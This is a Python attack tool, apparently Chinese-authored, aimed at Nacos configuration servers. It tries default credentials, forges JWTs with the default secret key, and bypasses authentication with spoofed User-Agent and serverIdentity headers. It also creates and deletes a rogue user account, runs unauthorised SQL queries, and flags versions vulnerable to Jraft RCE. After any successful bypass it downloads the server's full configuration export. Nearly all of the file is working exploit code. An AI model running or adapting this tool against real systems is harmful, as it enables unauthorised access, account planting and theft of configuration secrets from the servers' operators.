import requests
# need py install pyjwt
import jwt
import sys
import time, base64
from packaging.version import Version

class VulManager:
    def __init__(self, host,down, proxy) -> None:
        self.host = host
        self.down = down
        self.proxy = proxy
        self.down_ok = False
    # 默认密码
    def default_nacos(self, username="nacos", password="nacos"):
        session = requests.Session()
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        try: 
            paramsPost = {"password": password, "username": username}
            session.headers = {
                "Accept": "application/json, text/plain, */*",
                "Connection": "close",
                "DNT": "1",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            }
            response = session.post(
                self.host+"/nacos/v1/auth/users/login",
                data=paramsPost,
                timeout=2)
            #漏洞存在 statusCode == 200 ,不存在为403
            if response.status_code == 200:
                # accessToken = response.json()["accessToken"]
                # 下载
                if self.down:
                    if not self.down_ok:
                        session.headers.update(
                            {
                                'Authorization': f'Bearer {response.json()["accessToken"]}'
                            }
                        )
                        self.download_config(session)
                        # 更新下载状态，防止后续下载
                        self.down_ok = True
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            print(f"[-] {self.host} 连接超时，程序停止")
            sys.exit()

    # 默认JWT加密key
    # 存在漏洞response.status_code为200，否则为403
    def get_accesstoken(self):
        session = requests.Session()
        fake_jwt = self.gen_jwt()
        if self.proxy:
            session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }
        paramsPost = {"username": "nacos", "password": "nacos"}
        session.headers = {
            "Origin": self.host,
            "Authorization": "Bearer {}".format(fake_jwt),
            "Accept": "application/json, text/plain, */*",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.50",
            "Connection": "close",
            "DNT": "1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        }
        response = session.post(
            self.host + "/nacos/v1/auth/users/login",
            data=paramsPost
        )
        if response.status_code == 200:
            # accessToken = response.json()['accessToken']
            if self.down:
                if not self.down_ok:
                    session.headers.update(
                        {
                            'Authorization': f'Bearer {response.json()["accessToken"]}'
                        }
                        )
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        else:
            return False

    # 默认为user是nacos
    def gen_jwt(self):
        user = "nacos"
        headers = {"alg": "HS256", "typ": "JWT"}
        exp = int(time.time() + 18000)
        payload = {"sub": user, "exp": exp}
        # nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
        salt = "SecretKey01234567890123456789012345678901234567890123456789012345678"
        b64desalt = base64.b64decode(salt)
        fake_jwt = jwt.encode(payload=payload,
                            key=b64desalt,
                            algorithm='HS256',
                            headers=headers)
        return fake_jwt

    # V1 API身份验证绕过
    def cross_check(self):
        session = requests.Session()
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        paramsGet = {"pageSize": "999", "pageNo": "1"}
        session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0", 
            "Accept-Encoding": "gzip"
        }
        response1 = session.get(self.host + "/nacos/v1/auth/users/",
                            params=paramsGet
                            )
        # 存在两种形式的参数
        paramsGet2 = {"pageSize": "999", "pageNo": "1", "search": "accurate"}
        response2 = session.get(self.host + "/nacos/v1/auth/users/",
                            params=paramsGet2
                            )
        # response.status_code==200为存在漏洞
        if response1.status_code == 200:
            if self.down:
                if not self.down_ok:
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        elif response2.status_code == 200:
            if self.down:
                if not self.down_ok:
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        else:
            return False
        
    # UA：Nacos-Server身份验证绕过
    def cross_ua_check(self):
        session = requests.Session()
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        paramsGet = {"pageSize": "999", "pageNo": "1"}
        session.headers = {
            "User-Agent": "Nacos-Server", 
            "Accept-Encoding": "gzip"
        }
        response1 = session.get(self.host + "/nacos/v1/auth/users/",
                            params=paramsGet
                            )
        
        paramsGet2 = {"pageSize": "999", "pageNo": "1", "search": "accurate"}
        response2 = session.get(self.host + "/nacos/v1/auth/users/",
                            params=paramsGet2
                            )
        # response.status_code==200为存在漏洞
        if response1.status_code == 200:
            if self.down:
                if not self.down_ok:
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        elif response2.status_code == 200:
            if self.down:
                if not self.down_ok:
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        else:
            return False
        
    # serverIdentity鉴权绕过,用于绕过jwt鉴权
    def serveridentity_check(self):
        session = requests.Session()
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        paramsGet = {"pageSize": "999", "pageNo": "1"}
        session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0", 
            "Accept-Encoding": "gzip", 
            "serverIdentity": "security"}
        response1 = session.get(self.host + "/nacos/v1/auth/users/",
                            params=paramsGet
                            )
        
        paramsGet2 = {"pageSize": "999", "pageNo": "1", "search": "accurate"}
        response2 = session.get(self.host + "/nacos/v1/auth/users/",
                            params=paramsGet2
                            )
        # response.status_code==200为存在漏洞
        if response1.status_code == 200:
            if self.down:
                if not self.down_ok:
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        elif response2.status_code == 200:
            if self.down:
                if not self.down_ok:
                    self.download_config(session)
                    # 更新下载状态，防止后续下载
                    self.down_ok = True
            return True
        else:
            return False

    #添加用户
    def cross_apiauth(self):
        session = requests.Session()
        paramsGet = {"password": "lw-crossauth", "username": "lw-crossauth"}
        headers = {"User-Agent": "Nacos-Server", "Accept-Encoding": "gzip"}
        response = session.post(self.host + "/nacos/v1/auth/users/",
                                params=paramsGet,
                                headers=headers)
        print("Status code:   %i" % response.status_code)
        print("Response body: %s" % response.content)

    #删除用户
    def del_crossuser(self):
        session = requests.Session()
        paramsGet = {"username": "lw-crossauth"}
        headers = {"User-Agent": "Nacos-Server", "Accept-Encoding": "gzip"}
        response = session.delete(self.host + "/nacos/v1/auth/users/",
                                params=paramsGet,
                                headers=headers)
        print("Status code:   %i" % response.status_code)
        print("Response body: %s" % response.content)

    # 获取版本号
    def get_version(self):
        session = requests.Session()
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        url = self.host + "/nacos/v1/console/server/state"
        headers = {"User-Agent": 
                   "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
                    "Accept-Encoding": "gzip"}
        response = session.get(url, headers=headers)
        return response.json()['version']

    # 7848 集群nacos反序列化RCE
    def jraft_rce(self):
        """
        1.4.0 <= Nacos < 1.4.6
        2.0.0 <= Nacos < 2.2.3
        """
        # check 7848
        version_to_check = Version(self.get_version())
        if Version("2.0.0") < version_to_check < Version("2.2.3"):
            return True
        elif Version("1.4.0") < version_to_check < Version("1.4.6"):
            return True
        else:
            return False
    
    # nacos Jraft 文件读写漏洞
    def jraft_file_rw(self):
        version_to_check = Version(self.get_version())
        if version_to_check < Version("2.4.1"):
            return True
        elif version_to_check < Version("1.4.8"):
            return True
        else:
            return False
        
    # nacos 未授权SQL语句执行
    def authpass_sqlexe(self):
        session = requests.Session()
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
        }
        url = self.host + "/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st"
        header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
        response = session.get(url, headers=header)
        try:
            # 防止更改该页面后报错
            code_data = response.json()['code']
        except:
            code_data = 0
        if code_data == 200:
            return True
        return False

    # 下载配置文件
    def download_config(self, session):
        filename = str(self.host).replace('.', '_').replace('http://', '').replace(':', '_')
        url = f"{self.host}/nacos/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId="
        resp = session.get(url, stream=True)
        # 配置文件为空
        """ if len(resp.text) <= 22:
            return "" """
        with open(f"./config_zip/{filename}.zip", 'wb') as file:
            for chunk in resp.iter_content(chunk_size=8192):
                file.write(chunk)
            # print(f"[+] 文件已成功保存为 ./config_zip/{filename}.zip")